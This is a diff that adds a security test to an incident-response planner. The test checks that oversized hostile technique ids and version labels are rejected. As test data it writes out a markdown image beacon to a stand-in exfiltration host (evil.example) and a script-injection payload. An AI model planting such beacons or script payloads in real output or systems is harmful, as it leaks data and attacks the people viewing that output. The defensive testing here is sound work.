@@ -196,3 +196,27 @@ def test_report_states_the_plan_is_not_executed(tmp_path: Path) -> None:
     # Irreversible steps must be flagged before their instructions.
     assert "Irreversible steps requiring explicit approval" in content
     assert "Performed by:" in content
+
+
+@pytest.mark.security
+def test_hostile_technique_ids_and_version_never_reach_a_plan() -> None:
+    """Technique ids and the version label are identifiers, not free text.
+
+    Only the target was bounded; measured before the check, a 355-character
+    "technique id" carrying a heading and an image beacon, and a 225-character
+    version label, both rode into ``to_dict()`` verbatim.
+    """
+    planner = ResponsePlanner()
+    hostile = "# Injected\n![x](https://evil.example/?d=exfil) " + "A" * 300
+    mitre = {
+        "techniques": [{"technique_id": "T1110"}, {"technique_id": hostile}, {"technique_id": 7}],
+        "attack_version": "<script>alert(1)</script>" + "B" * 200,
+    }
+    plan = planner.plan_for_event(mitre, {"indicators": ["203.0.113.5"]})
+    assert plan is not None
+    assert plan.techniques == ("T1110",)
+    assert plan.attack_version == ""
+    rendered = json.dumps(plan.to_dict())
+    assert "evil.example" not in rendered and "<script>" not in rendered
+    with pytest.raises(ValueError, match="technique ids"):
+        planner.plan_for_techniques(["T1110", hostile], ["web-01"])
